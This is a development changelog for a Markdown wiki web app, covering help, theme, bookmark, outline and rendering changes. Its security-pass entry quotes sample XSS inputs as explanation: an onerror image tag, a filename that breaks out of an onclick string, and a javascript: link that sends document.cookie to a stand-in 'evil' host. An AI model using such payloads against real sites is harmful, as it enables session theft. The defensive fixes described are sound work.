# Project-WikiBase — Changelog

*One entry per shipped deploy zip. Newest at top. Not a substitute for the session log — this is the short version, for tracking what actually went out the door.*

*Versioning (locked 2026-07-22): `MAJOR.MINOR.PATCH`. MAJOR stays `0` for the whole beta — moves to `1` at full release. MINOR bumps when a session ships new user-facing capability; PATCH bumps when a session only fixes or polishes what's already shipped. MINOR always resets PATCH to `0`. Everything below `0.12.0` was originally shipped under an older `vX.Y[-N]` tag — those are noted per entry for traceability against already-shipped deploy zips. Everything from `0.12.1` onward is native to this scheme.*

*Note: the entries reconstructed as v0.8c / v0.8d / v0.8e-1 below are from partial notes — those sessions moved the app forward without a session-log entry at the time (a known documentation gap). Everything from v0.9a onward was tracked in full going forward.*

---

## 0.19.0 — 2026-08-03

**Changed:** `index.html`, `help.md`
**Added:** `help-edit.md`, `help-assets/` (8 SVG figures)

*Help was rewritten and split in two. It had drifted badly — the version on disk was written at 0.12.0 and still described the right panel as four icons with a pinned Comments strip, Settings as a header gear, and Themes as five header-colour palettes. None of that had been true for six versions.*

- **Two help pages, cross-linked.** **Help** covers using the wiki — installing, panels, the sidebar, reading, search, bookmarks, themes, comments, troubleshooting. **Help — Editing and Markdown** covers changing things — enabling editing, creating and moving files, the editor, properties, review, and the full Markdown reference. The **?** button still opens the first one; the two link to each other in the reader.
- **`openHelp()` generalised to `openHelpDoc(file)`**, driven by a new `HELP_DOCS` map that is both the title lookup and the **allowlist**. A link is only pulled into the reader if its href is a literal key in that map — not a pattern match — so a vault note named `help-notes.md`, a `../help.md`, or an external URL ending in `help.md` all fall through to normal link handling. `openHelp()` is kept as a thin wrapper, so every existing call site is untouched.
- **Help links no longer navigate away.** A `[text](help-edit.md)` link used to fall through to the external branch of `renderInline()` and open raw Markdown in a new tab. It now emits `data-wb-helpdoc` and is handled in `wbDelegatedClick` — a `data-wb-*` attribute rather than an inline `onclick`, per the S12 hardening rule.
- **Eight figures**, hand-drawn SVG rather than screenshots: the screen, the header bar, panel edges, the sidebar, the reader's corner controls, right-panel stacking, bookmarking, and the Theme panel. Drawn from `PRESETS.things.dark` and the real icon paths in this file, so they match a default install. About 50 KB for the set, versus roughly 2 MB of PNGs, and they are edited rather than recaptured when the UI moves.
- **Figures live in `help-assets/` beside `index.html`, referenced as `![alt](help-assets/x.svg)`** — deliberately *not* in the vault. Help is fetched with `fetch('./help.md')`, so its relative paths resolve against the app, never the vault; and the `![[x.png]]` form resolves against the *current note's* attachments folder, which does not exist while help is open (`activeUrl` is null). Being app-side also keeps documentation out of everyone's OneDrive and invisible to the nav tree for free.
- Help and its images stay **network-only** — `sw.js` is unchanged, and `isShell()` never matched help. No cache to go stale, no offline help, same as before.
- Corrected three things the old page had simply wrong, beyond staleness: Comments was described as having "This file / Vault" tabs and a **+** button (neither exists — the tab is per-file, the vault-wide view is the separate Comment Inbox); **New (+)** creates at the vault root only, with per-folder creation on the folder row's own hover **+**; and **Reject** in review reverts the file rather than only flagging it.
- Verified with a 34-check jsdom suite (`supporting/tests/help-split.test.js`) covering both docs loading, the cross-link round trip, the allowlist against four near-miss hrefs, all eight figures resolving to files that exist on disk, Outline populating separately for each doc, and the missing-file fallback. The existing 136-check theme suite re-run clean against the modified file.

---

## 0.18.0 — 2026-08-02

**Changed:** `index.html`

*Theme panel, pass 2 of 2. The feature is complete — the three "Soon" rows are real sections now.*

- **Navigation icons.** Icon style: Folder and file (current) / Chevron / Dot / None. Folder colour: Rainbow by position (current) / Accent / Single colour / Muted, with a six-swatch picker when Single is chosen, matched per mode to the palette the rainbow already cycles. New "Colour file icons too" toggle, off by default — file icons stayed muted before and still do unless you ask. The chevron and dot glyphs ride along inside the same icon markup and are swapped by CSS off `body[data-navicons]`, so the string-building sidebar renderer didn't need to branch on a preference. Files get no chevron in Chevron style on purpose: nothing unfolds under a leaf, so the indent and guide line carry it instead.
- **Interface.** Chrome tone: Contrast (current) / Match reader (sidebar and header adopt the reader surface) / Flat (one surface everywhere). Borders: None / Hairline (current) / Strong. Active row indicator: Bar / Tint / Both (current). Density: Compact / Normal / Roomy, driving the nav, root file and Outline row padding from one pair of variables. **Borders → None only clears the decorative `--border`**; `--border-strong` is deliberately kept, because toggle tracks, resize handles and input outlines lean on it and zeroing it makes them vanish rather than look minimal.
- **Share.** Export the theme as a single `WBTHEME1:` string to paste to a teammate, and Apply pasted to take one. **Mode is deliberately not shared** — dark vs light is personal (and can be System), so an export never forces someone else's screen to your preference. Import applies only the keys this build knows about, so a string from a newer version can't inject arbitrary state and one from an older version just leaves newer controls at their defaults; an unknown preset falls back to the default rather than rendering nothing.
- **Set as vault default** writes `zSystem/theme.json`, reusing the existing hidden sidecar convention (same place as the identity records and `.comments.md`/`.changes.md`) rather than inventing a new one. It's read at boot **only on a device that has never had a theme of its own** — no v2 record and nothing from the pre-S32 keys either — so it gives a new person the team's look on first load and never overwrites a choice anyone has already made. A missing or malformed vault theme is swallowed and can't hold up or break boot.
- Copy falls back to selecting the string when `navigator.clipboard` is unavailable (file:// and some embedded WebViews are not secure contexts), rather than leaving a dead button.
- Test suite grown to 136 checks, adding icon modes, chrome tones, border tones, the fresh-device gate, share round-trip, the unknown-key and unknown-preset guards, and the pass-2 reset paths.

---

## 0.17.0 — 2026-08-02

**Changed:** `index.html`

*Theme panel, pass 1 of 2. Pass 2 (navigation icons, interface chrome, theme sharing) is listed in the panel as "Soon" but not built.*

- **New Theme panel**, opened from the user badge dropdown above Settings. Anchored popup rather than a modal, so the reader stays visible and every change shows live behind it. Closes on the X, Esc, or a click outside. No Save button — every control writes to storage the moment it's changed. Reset per section, Reset all in the footer. Sections are an accordion, one open at a time, which is what keeps the panel one screen tall as more sections land.
- **Presets replace the old Header colors × Background color pair of dropdowns.** Those two lists let any palette pair with any background — 64 combinations, most of them mismatched — and left the accent unthemeable. One preset now sets backgrounds, all six heading colours and the accent together, with separate dark and light definitions, and Mode (Dark / Light / **System**, new) is an independent switch. The Theme block is gone from Settings, which keeps Navigation and Advanced.
- **Two presets renamed:** `Dark` → **Default** and `Light` → **Ocean**. The old names collided with the Dark/Light mode names and read as "the light theme", which neither of them ever was.
- **H5 and H6 have real colours in all eight presets.** Seven of the eight previously fell back to secondary grey, which was invisible until the panel showed all six levels side by side.
- **Accent is user-selectable** for the first time: the preset's own accent plus six alternates, tuned separately per mode. Tag chips now follow the accent on purpose (they matched it by coincidence before, both hardcoded to the same blue), so a green accent no longer leaves blue tags behind.
- **Per-level heading colour and underline, H1 through H6.** Underlines were H2-only; each level now draws in its own heading colour. Custom heading colours are stored separately for dark and light, since a colour that reads on near-black often fails on white — editing any colour seeds the full six from the current preset and flips the badge to Custom, with a one-click "Copy these to <other> mode". Picking a named preset again clears the override.
- **New reading controls:** width (Narrow / Normal / Wide), text size, line spacing, body font (system sans / serif / monospace), and a single Heading scale (Compact / Normal / Large) instead of six per-level size fields.
- **Per-level capitals, H1 through H6**, as a smaller secondary toggle to the left of each underline switch. H5 was hardcoded to uppercase with no way to turn it off; it's a per-level opt-in now, shipping on for H5 and off everywhere else so an untouched install is unchanged. Letter-spacing rides along with the transform — tracked-out capitals are the point, plain uppercase at normal spacing reads cramped.
- **Inline title** (off by default): the note's own name rendered as a large heading at the top of the document, Obsidian-style. The reader header bar keeps showing the filename either way.
- **Under the hood:** the 32 hand-written `body[data-theme][data-headers]` / `[data-bg]` CSS rules are replaced by one `PRESETS` table in JS; `applyThemePrefs()` writes the resolved values as inline custom properties on `<body>`, so every existing `var(--heading-1)` / `var(--accent)` / `var(--bg-sidebar)` in the file keeps working with no CSS rewrite. No `color-mix()` or other newer colour function anywhere — the v0.14.4 lesson holds; the accent tint is computed hex→rgba in JS.
- **Storage:** one new `wb_theme_v2` record, migrated once from `wb_theme` / `wb_headers` / `wb_bgcolor` / `wb_h2underline`. The old keys are deliberately left in place, so reverting this file restores the previous look with no data loss.
- **Known behaviour change:** if you had a header palette and a background from two different identities, the background now follows the palette. Removing that mismatch is the point of the pass.
- Verified with an 81-check jsdom suite (`supporting/tests/theme.test.js`) covering preset completeness, migration, panel render, write-through, per-mode custom isolation, per-level caps and underlines, reset paths and the banned-colour-function rule.

---

## 0.16.0 — 2026-07-30

**Changed:** `index.html`

- Clicking a heading's own text in the reader (not its fold chevron) now selects it: mirrors it as the Outline's active item and highlights the row, reusing the exact pin already used for an Outline-click jump (`pinJumpHighlight`/`clearJumpHighlight`) — holds until you scroll away, same as before. Clicking the chevron still only folds/unfolds, unaffected — the two are now separate click targets, the same split the Outline panel already uses between its own fold-chevron and jump buttons.
- Gives Collapse Unused a reliable "current heading" from an explicit click, instead of only whatever the scroll-spy last happened to land on — no changes needed to Collapse Unused itself, it already reads the Outline's active item.

---

## 0.15.0 — 2026-07-24

**Changed:** `index.html`

- New Bookmarks tab in the right panel, between Outline and Comments. Bookmark ribbon icon added to every heading row in the Outline (always visible, not hover-gated) — click toggles a bookmark on that file+heading pair (no content stored), with a brief confirmation tip (reusing the existing folder-link-copy tip style) when one's added or removed.
- Bookmarks tab has two sections: Favorites (flat, user-ordered, empty by default) and Bookmarks (grouped by file, heading order fixed to document order — only the file itself can be reordered or filed into a group). Hovering a bookmark row reveals a star to promote it into Favorites (stays in both places); hovering a Favorites row reveals a pencil to rename it — the only place a favorite can be renamed.
- Organize mode: a sliders toggle in each section header (off by default) gates drag-and-drop reordering, grip handles, and a drop zone to pull an item out of a group. A folder-plus icon in each header creates a single-level named group (no nesting) — available regardless of organize mode, since creating an empty group can't cause an accidental reorder.
- Clicking a bookmark or favorite jumps the reader straight to that file and heading — same underlying open-file-and-jump mechanism as clicking directly in the Outline (not a separate code path), so Outline (if also open in the right-panel stack) follows along and highlights the same heading. If the target heading was collapsed, its own subtree unfolds too (`expandHeadingSubtree`), on top of the existing ancestor-chain unfold `revealHeading` already did.
- Storage: personal per-user, saved into the same vault-file identity record used for the header badge (S15) — the `favorites: []` stub from that session was unused until now; replaced with a richer shape (`bookmarks: {files, top, groups}`, `favorites: {items, top, groups}`), with a migration path (`normalizeUserBookmarkData`) for any record still on the old empty-array shape.

---

## 0.14.4 — 2026-07-23

**Changed:** `index.html`

- Resize-handle flare color bug, root-caused properly this time: it was rendering a solid `color-mix()`-computed tone, and `color-mix()` isn't supported everywhere this file can render (SharePoint/Teams embeds can use an older WebView). An unsupported color function makes the whole CSS variable invalid, and SVG `fill` falls back to its default — solid black — which is exactly the black flashing that kept getting reported as a "fade." Replaced every `color-mix()` call with pre-computed hex values, hardcoded per theme and per background variant (16 combinations total), so there's no runtime color function that can fail.
- Second, separate cause of the same black flash: the flare's icon shape never had a default `fill` set for the moments it's not actively hovered/collapsed — only the active-state rules set a color. During the brief opacity fade-out on mouseleave, with no state class matching, it fell through to that same SVG black default. Added a real base fill so the icon always has a valid color, faded or not.
- Removed the "lights up anywhere in the open sidebar/right-panel" hover trigger — turned out to be unwanted once a panel is already open and visible; the flare now only brightens on a direct hover of the handle itself, and stays on permanently when a panel is collapsed (unchanged).
- Removed the redundant sidebar/right-panel toggle buttons from the header — the resize-handle flare has done this job since v0.14.0, so the header's duplicate icons were unnecessary. The flare now calls the toggle logic directly instead of proxying through the header button's click.
- Icon glyph inside the flare shrunk twice this round, roughly 40% smaller overall than the v0.14.3 size, plus the color transition on the flare's fill and the handle line's background was removed entirely (snap instantly on state change, no easing) since animating between the two tones kept reading as a distracting flash rather than a smooth fade.

---

## 0.14.3 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse control redesigned: replaced the floating rounded-square icon box with a shape that flares directly out of the drag line itself — a rounded-top tab tapering smoothly back into the 4px line, rather than a separate element sitting near it. Left edge of the flare is flush with the line (no centering math, so no edge-clipping risk either). Icon is the same rect-and-line shape as the header's own sidebar/right-panel buttons, with one small addition — the sidebar icon shades its left segment, the right-panel icon shades its right segment, so it's unambiguous which panel each controls. Same interaction rules as before: lit on hovering the line or anywhere in that panel, hidden otherwise, permanently on once collapsed, and the whole flare shape (not just the icon glyph) is the click target.
- Reader corner-control alignment (Back/Forward/filename, fold-pill/Properties/Edit): added `scrollbar-gutter: stable` to the reader's scroll container. The corner-control wrapper sits outside that scrolling box while the document text centers inside it — without a stable gutter, the two can compute their centering against very slightly different widths (whether a scrollbar happens to be showing) and drift apart, most noticeably around a panel collapse.

---

## 0.14.2 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse icon: moved up to line up with the reader's own nav-pill/fold-pill row (top:8px, was 14px), color reverted to the app's standard muted icon tone (the higher-contrast version from v0.14.1 looked odd in practice), and it now lights up from anywhere in the sidebar or right-panel — not just the thin 4px handle line itself. Still shows permanently once a panel is collapsed, unchanged.

---

## 0.14.1 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse icon, three fixes from testing v0.14.0: it's now actually clickable (a direct shortcut to the same toggle as the header button, not just a passive indicator), bigger (26px, up from 20px), and reuses the exact panel-toggle icon already used on the header's sidebar/right-panel buttons instead of the chevron from the mockup — higher-contrast color (`--text-primary`) so it reads clearly against the handle line. Position unchanged from v0.14.0 (kept near the top, not lowered).
- Reader corner controls (Back/Forward/filename on the left; fold-pill/Properties/Edit on the right) now align with the document's own left/right text margin instead of the raw reader panel edge. New shared `#reader-corner-align` wrapper mirrors `#reader-content`'s own max-width/margin/padding, so the alignment holds automatically at any window width or sidebar/right-panel state — no JS resize handling needed.

---

## 0.14.0 — 2026-07-23

**Changed:** `index.html`

- Per-user identity (S15): first-run prompt asks for name and email, then remembers you. The record lives in the vault itself at `zSystem/Users/<email>.json` — same hidden sidecar folder already used for comments/change-log files, just at vault root — so entering the same email on a different PC gets recognized as the returning user (record wins over whatever name is typed) instead of creating a duplicate profile. `wb_user_email` in localStorage is only a pointer to which file is "me" on this device.
- Header badge replaces the old Settings gear. The user's initials now sit rightmost in the header (order left to right: theme, help, badge); clicking it opens a small dropdown with name/email, a Settings entry (opens the same settings panel as before, just relocated), and Switch user (clears local identity and re-prompts). Favorites entry point intentionally deferred to next session.
- Sidebar and right-panel resize handles now show a small collapse/expand icon on hover, and leave it on permanently once the panel is collapsed — previously the only visual cue was the handle line itself turning accent-colored on hover, with no indicator at all when a panel was already closed.

---

## 0.13.0 — 2026-07-22

**Changed:** `index.html`

- Right panel now stacks tools instead of one-at-a-time tabs (Outline, Comments, Links, Review, Search). Click a tool icon to add it to the stack or remove it; any number can be open together, stacked top to bottom in click order, each scrolling independently with a drag handle between adjacent panes to resize their share of the space. Double-click a tool icon to open it alone, closing everything else in the stack — reuses the double-click convention already established for resize-handle collapse (v0.5.0) and list subtree-fold (v0.11.0), not a new gesture.
- ⌘K/Ctrl+K adds Search to the stack alongside whatever's already open instead of replacing it; a second Escape (once the search field is already empty) removes just Search from the stack. Turning off Settings → review tools now removes Review from the stack rather than assuming it was the only thing open.
- Which tools are open persists per browser (`wb_rp_open`), same as every other panel preference. The height split between open panes is session-only and resets to even on reload — no drag-ratio storage added for this, kept to the one new key.

---

## 0.12.1 — 2026-07-22

**Changed:** `index.html`

- List-item fold state now persists, matching heading fold memory. Folding a list item (or its whole subtree via double-click) previously only toggled a CSS class with nothing saved — closing and reopening the file, or reloading, lost every list fold. Now stored in `wb_li_folds:<url>`, keyed by each item's position-path in the tree (list items have no natural id the way headings do).

---

## 0.12.0 — 2026-07-21 *(was v0.9i-2)*

**Changed:** `index.html`, `help.md`

EXPERIMENTAL, revertible — see help.md "Tab trees under a bullet."

- **A tab-indented tree with no list markers below the first line now renders correctly**, as long as that first line has a real marker (`-`, `1.`, or `- [ ]`). Traced from a real note (a folder-directory diagram, tabs + a manually-typed folder emoji, no dashes anywhere) that was rendering as one flattened paragraph. Root cause, confirmed against actual Obsidian screenshots: Obsidian's Reading view *also* can't render this without a marker — it drops the indentation and shows flat lines. The tree look Jayson wanted only exists in Obsidian's Edit/Live Preview pane (raw source with editor indent-guides, not rendered markdown). Decision: match the Edit-mode visual anyway, since that's the useful one, not Reading view's flattened output.
- Mechanic: one real marker on the block's first line triggers list parsing, same as always. Every line below it that's tab/2-space indented — marker or not — now becomes its own row in the tree (fold arrows, guide line, no bullet glyph for the marker-less rows). This **replaces** the previous behavior where a marker-less indented line merged into the item above as wrapped continuation text.
- **Trade-off, accepted on purpose:** there's no way to distinguish "this line continues the row above" from "this is a new row" once there's no marker — so every line is now always its own row. A genuinely wrapped multi-sentence description under one row has to be written as a single line and left to wrap, not split across Enters.
- Three simulated samples confirmed before building: the tree-vs-flat comparison against real Obsidian screenshots, the bullet-vs-tab-list explainer (why the marker is the only signal available), and the final one-bullet-triggers-tree behavior itself.

---

## 0.11.1 — 2026-07-21 *(was v0.9i-1)*

**Changed:** `index.html`

Follow-up fixes from Jayson's testing pass on v0.9i, three items.

- **Continuation-line grouping fix had a gap:** the regex only matched exactly one leading tab (`/^(\t| {2,})\S/`), so a marker-less continuation line nested two or more tabs deep still failed the check, broke the list block early, and rendered as a stray paragraph — "shows properly in Obsidian" but not here, for tab-indented lists specifically. Replaced with a check that accepts any run of tabs (1+) or 2+ spaces.
- **Native list markers were still showing, doubled up with the new fold chevron.** `.md-ul`/`.md-ol` never had `list-style: none` set, so the browser's own bullet/number rendered in its usual gutter *in addition to* the new chevron column — visually offset, and `padding-left: 1.5rem` (sized to reserve room for that native marker) on top of the chevron's own width meant every line had noticeably less room for text, so lines wrapped far more than before ("really long on the page"). Fixed by rendering the bullet/number explicitly per item instead of relying on native markers, turning `list-style` off, and shrinking the now-redundant `padding-left` down to a small edge margin.
- **Chevron reordered to sit outside the marker, not between it and the text** — direct result of the fix above: row order is now chevron → bullet/number/checkbox → text, left to right, with nothing else competing for that first position.
- Incidental fix while rewriting the marker: ordinal numbers were computed from raw array position within a list level rather than counting only the `ol`-kind items in it, so a level with, say, a checkbox mixed in ahead of numbered items would skip numbers. Now counts only the numbered items.

---

## 0.11.0 — 2026-07-21 *(was v0.9i)*

**Changed:** `index.html`

Reader panel (S3) — nested list rendering, plus a related same-file link fix.

- **Lists now nest for real.** Bullet, numbered, and checkbox items previously rendered as one flat level regardless of indentation — indent was captured but never used. Depth is now computed per Obsidian's own rule (a tab, or a run of 2 spaces, each count one level; no distinction between bullet/number/checkbox — Obsidian nests all three the same way under the hood), and the reader builds real nested `<ul>/<ol><li>` structure from it.
- **Tab-indented continuation lines no longer fall out of the list.** A marker-less indented line (e.g. a wrapped note under a bullet) used to fail the block-grouping check if it was tab-indented rather than space-indented, breaking the list block early and rendering as a stray paragraph. Grouping now accepts a tab or 2+ spaces; a marker-less line attaches to the previous item as continuation text instead of being dropped.
- **Left-border guide line on nested levels,** Obsidian Minimal-style, applied globally via one class — not a special case per level.
- **Fold control, chevron-only.** Every item with children gets a fold chevron (default expanded, so nothing collapses on you unexpectedly). Only the chevron is clickable — the row text has no cursor, no click handler, and `user-select:none`, so it can't be folded or text-highlighted by accident. Single-click folds just that item's direct children, matching heading fold. Double-click folds/unfolds its entire subtree at once, all levels down — works at any depth, not just top-level items. Click/dblclick are disambiguated with a short delay (single-click's action is held ~220ms and cancelled if a second click arrives), otherwise a double-click would fire the single-fold once before the subtree-fold landed on top of it.
- **Same-file wiki links now scroll instead of reloading, regardless of link form.** `[[#Heading]]` already scrolled in place; `[[File#Heading]]` / `[[File#Heading|text]]` pointing at the file already open still forced a full reload+rescroll. Both forms now resolve the same way when the target is the currently open file.

---

## 0.10.1 — 2026-07-21 *(was v0.9h)*

**Changed:** `index.html`, `help.md`

Security pass. No new features. Four findings from an audit of the reader, all closed.

- **Notes can no longer inject HTML into the reader.** `renderInline()` handed the raw text of a `.md` file to `innerHTML` without escaping it, so HTML typed into a note rendered as live markup — an `<img src=x onerror=...>` in a note ran script for every reader who opened it, holding their SharePoint session. The markdown source is now escaped before any parsing runs. Consequence: raw HTML in notes displays as literal text by design. Obsidian permits HTML (sanitized); WikiBase does not. Nothing in the current vault used it, so nothing visibly changed.
- **Apostrophes in filenames can no longer become executable code.** Several renderers interpolated names and URLs into single-quoted JS strings inside `onclick` attributes. A note or file named `foo');alert(1)//` closed that string and ran whatever followed. Every dynamic handler — sidebar rows, wiki links, embed stubs, backlinks, the Links panel, the Review and Changes inboxes, the Outline — now uses data-attributes read by one delegated listener, where the value is data and can never be parsed as code. `escHtml()` also escapes apostrophes now, as defence in depth. This was a correctness bug as well: names like `Q1 O'Brien notes.md` were already broken in those panels.
- **Link and image URLs are checked against a scheme allowlist.** `[Click me](javascript:fetch('//evil/'+document.cookie))` rendered as an ordinary link and fired on click. http, https, mailto, tel, file and obsidian pass; everything else degrades to plain text. Obfuscation via case, leading whitespace and embedded tabs/newlines is handled. The Links panel applies the same rule, so a blocked link is not still clickable there.
- **Added a Content-Security-Policy.** Backstop, not the fix. `connect-src` is the important line — it stops injected script posting note contents to an outside server. `frame-ancestors` is deliberately absent: it is ignored in a `<meta>` tag and only works as an HTTP header, which a file in a document library cannot set.
- `help.md` "HTML" section rewritten — it documented raw HTML as a supported feature.
- Incidental fix found along the way: a link with a malformed percent-escape (`[x](100%.md)`) threw inside `decodeURIComponent` and killed the render of the whole note. Now caught.

**Known, deferred:** `script-src` still needs `'unsafe-inline'` because ~40 inline `onclick` attributes remain in the *static* markup (toolbar and modal buttons). Those take no dynamic values and are not exploitable, but while the keyword is present `script-src` provides no real XSS protection. Converting them and dropping it is the last step.

---

## 0.10.0 — 2026-07-21 *(was v0.9g)*

**Changed:** `index.html`

- Fixed the version tag showing v0.9c while the changelog was already at v0.9f — it's a static label, not derived from the changelog, and had drifted. Bumped to match; "bump version + changelog together" stays a standing close-checklist item.
- Reader top fade shrunk from 72px to 48px — still fully backs the corner buttons, but reads as less dead space at the top of the page. The fade now also disappears entirely when the reader is scrolled to the very top of a file, so the first heading no longer fades for no reason (there was nothing behind it to hide in the first place).
- Fixed the real cause of Outline clicks sometimes highlighting the wrong item. When a clicked heading landed close enough to its neighbor that both fell inside the scroll-spy's detection zone at once, the neighbor's intersection callback could fire after the clicked heading's and silently steal the highlight. An Outline click (or same-page/cross-file anchor jump) now pins the outline highlight and the reader row highlight directly to the heading you jumped to, and the scroll-spy stands down until you actually scroll again — so it can't get overwritten by a neighbor, and it no longer fades on its own after ~1.4s; it stays until you scroll.
- Reader panel gets a real header bar: Back/Forward move into it (were floating solo, top-left), followed by the current file's name, trimmed of its `.md` extension, flexing to fill the space up to the fold/Properties/Edit cluster on the opposite corner.
- Task checkboxes are clickable straight from the reader, no need to open the full editor for a status tick. Gated by the same "Enable editing" + author-list check already used for New/Move/Edit. Saves immediately and silently, no change-log entry, no Needs Review flip, same treatment as Properties-panel edits.

---

## 0.9.3 — 2026-07-20 *(was v0.9f)*

**Changed:** `index.html`

- Fixed Outline clicks sometimes not scrolling the reader at all — worse on closely-nested headings, but not limited to them. A heading inside a folded ancestor section is `display: none`, so its rect is empty and the scroll math landed nowhere. Outline clicks (and same-page/cross-file anchor links, same underlying bug) now expand the target heading's ancestor chain first, same rule already used by Collapse unused, before scrolling to it. Both code paths now share one `revealHeading()` implementation instead of two separate ones.
- The heading you jump to now lands clear of the button/fade strip at the top of the reader instead of partially underneath it (offset increased from 10px to 56px).
- Jumping to a heading now gives it a brief highlight (same tint as hovering a heading row) that fades out on its own, so it's clear where you landed.
- Increased the reader-fade strip's solid coverage so it fully clears the button row before it starts fading — the previous version was still partly see-through right where the buttons sit.

---

## 0.9.2 — 2026-07-20 *(was v0.9e)*

**Changed:** `index.html`

- Fixed local test mode images showing a broken-image badge instead of the picture (found while confirming the v0.9d image fix on a OneDrive-synced local vault). The placeholder src built for local mode was `local:/Folder/Attachments/image.png` — WikiBase's own internal file identifier, not a real URL. Setting that as an `<img src>` made the browser try to load `local:` as an actual protocol and fail instantly with `ERR_UNKNOWN_URL_SCHEME`, before the async local-file lookup that supplies the real blob URL ever got a chance to run. Local-mode images now render with no `src` at all until that lookup finishes; a genuinely missing file now shows the fallback badge explicitly (there's no failed network request left to trigger it automatically). SharePoint mode is unaffected — it always used a real fetchable URL.

---

## 0.9.1 — 2026-07-20 *(was v0.9d)*

**Changed:** `index.html`

- Fixed the real image bug (v0.9c's fix addressed a different cause of the same symptom). The broken-image fallback markup built the error icon as a string spliced directly into the `onerror="..."` attribute — but the icon is an SVG with its own double-quoted attributes, and a double quote nested inside a double-quoted HTML attribute closes it early. That's what was splicing "Pasted image x.png" and a trailing `'">` into the page and corrupting rendering for everything after it. Replaced with a shared `wbImgError()` function that builds the fallback via DOM methods instead of attribute strings, used by both the inline and standalone image renderers.
- Fixed duplicate Outline highlighting. Heading ids were generated from heading text alone with no uniqueness check, so two headings with the same text (e.g. two "Overview" sections) got the identical DOM id — the Outline's highlight, which matches by id, lit up both rows at once. Ids now de-dupe within a document (second occurrence becomes `h-overview-2`); anchor links still resolve to the first occurrence, unchanged.
- Back/Forward now restores scroll position, not just which file was open. The history stacks store scroll offset alongside url/name; Back and Forward return you to it. Any other navigation (sidebar, wiki link, search) still opens at the top.
- Reader content no longer scrolls with a hard cutoff under the floating corner buttons (Back/Forward, fold controls, Edit, Properties). Added a gradient fade strip above the scroll area so text dissolves before it reaches the icons.

---

## 0.9.0 — 2026-07-20 *(was v0.9c)*

**Changed:** `index.html`

- Fixed a major image bug: `renderInline()` restores images/links into text with `s.replace(placeholder, html)`. Plain-string `.replace()` treats `$&`, `` $` ``, `$'`, `$$` in the replacement as special patterns even without a regex, so an image name, alt text, or link title containing a lone `$` (a cost figure, a filename with a dollar sign) spliced fragments of the surrounding raw markdown into the rendered page — the stray `'">` and swallowed/uncollapsible headings Jayson was seeing. Fixed by passing a replacer function instead of the raw string on both the link/image and code restore lines, so the replacement is always inserted literally.
- H6 headings now get a color instead of falling back to gray — added purple to the Minimal theme's heading palette (`#9e86c8`, confirmed against Obsidian Minimal's own `--color-purple`), completing the existing red→orange→yellow→green→blue rainbow.
- Tables: top/bottom spacing around the table is now padding, not margin (margin was collapsing against the paragraph above, making the top gap read thinner than the bottom). Header row font size now matches the body (14px, was 12px). Tables are content-width and left-justified instead of forced to 100%, matching Obsidian — cells only wrap when the table would otherwise overflow the reader column.
- Outline panel now walks headings H1–H6 (was capped at H3). Removed a stray CSS override that shrank H3 outline entries to 11px while every other level was 12px.
- Outline's active item and the Vault browser's active file now share the same highlight treatment: accent-tinted background plus the existing colored text and right border, instead of text color alone.
- Reader panel back button is now a Back/Forward pair (top-left, mirrors Properties/Edit on the opposite corner). Removed the redundant Back button from the top header bar. Added a session-only forward stack alongside the existing back stack — Back moves the page you're leaving onto Forward's stack and vice versa, same as a browser tab; any other navigation clears Forward's stack.

---

## 0.8.1 — 2026-07-20 *(was v0.9b-1)*

**Changed:** `index.html`

- Fixed heading links showing a literal `#` in the rendered text. `[[#Header Name]]` (same-page) was displaying as "#Header Name" instead of "Header Name" — the display-text fallback was building itself from the raw `#heading` fragment instead of the heading name alone. Linking to a heading in another file (`[[File Name#Header Name]]`) still shows just the file name, unchanged — no `#` was found in that path on inspection; flagged for Jayson to confirm after this fix.

---

## 0.8.0 — 2026-07-20 *(was v0.9b)*

**Changed:** `index.html`

- Folder/file-share links (`file://` UNC or drive paths) no longer attempt to open — browsers can't launch a native Explorer/Finder window from a page link, and the attempt was navigating to a broken URL. Clicking one now copies a cleaned, decoded path (no percent-encoding) to the clipboard and shows a brief "Copied to clipboard" confirmation, ready to paste into Explorer's address bar.
- Fixed a real bug this surfaced: bold/italic/strikethrough/highlight parsing ran on the raw line before links and images were parsed out, so `_`, `*`, `~~`, or `==` inside a link target or filename got read as formatting and silently eaten (this is why underscores were vanishing and paths looked "trimmed" when copied). Links and images are now protected in placeholder slots immediately, the same technique already used for inline code, before any formatting regex runs. Fixes every existing link/image/note title with one of those characters in its target, not just the new folder-link feature.
- Reader corner controls: removed the pill background/border around Collapse all/Collapse unused/Expand all — now plain icon buttons with one separator against Properties instead of a rounded group.
- Vault sidebar header: added a bold "Vault Files" label, removed the divider line below it. The three fold buttons now hide as a group (not individually) when the sidebar narrows enough that they'd crowd the label, and reappear once there's room.
- Outline panel header: same treatment — text label "Outline" (was an icon), divider line removed. Lock toggle (independent/shared fold state) stays, positioned left of the fold buttons with its own separator; the whole group (lock + fold buttons) hides together at narrow widths, same mechanism as the sidebar.
- Comments, Links, Review changes, and Search panel headers now match the same left-justified label style, divider line removed. No button group on these — nothing to hide.

---

## 0.7.0 — 2026-07-19 *(was v0.9a-5)*

**Changed:** `index.html`

- Outline panel now folds. A chevron appears on any heading that has a nested heading below it (leaf headings get no chevron); clicking it hides/shows just its own descendant entries.
- New lock toggle in the Outline toolbar, left of Collapse all / Collapse unused / Expand all: unlocked (default) keeps the Outline's fold state independent of the reader; locked shares the reader's own per-file fold memory, so folding a heading either place folds it both places.
- Outline's Collapse all / Collapse unused / Expand all are now wired up — Collapse unused keeps the active heading and its ancestor chain expanded, same rule as the sidebar and reader fold pill.

---

## 0.6.0 — 2026-07-19 *(was v0.9a-4)*

**Changed:** `index.html`

- Added Collapse all / Collapse unused / Expand all icons to the sidebar (vault browser). Collapse unused keeps the folder path to the currently open file expanded, closes everything else.
- Added a matching fold-control pill (neutral gray, not accent-colored) to the reader panel, left of Properties — same three actions, over the open file's own heading sections. Collapse unused keeps the current heading (per Outline's active-heading tracking) and its ancestor headings expanded.
- Added a Back button: one next to the sidebar toggle in the header, one mirrored top-left of the reader panel (opposite Properties/Edit, same size). Session-only "previous note" history, multiple steps back, resets on reload.
- New/Move header icons are now fully hidden when Settings → Enable editing is off, instead of grayed out. Shown at full weight (matching every other header icon) when it's on.
- Renamed Advanced Settings → "Enable editing (New / Move / Edit)" to "Enable editing".
- The version tag (bottom-right) is now clickable — opens a Changelog view in the reader, same behavior as Help (including the Outline-refresh fix from v0.9a-3, so Outline doesn't show stale headings).
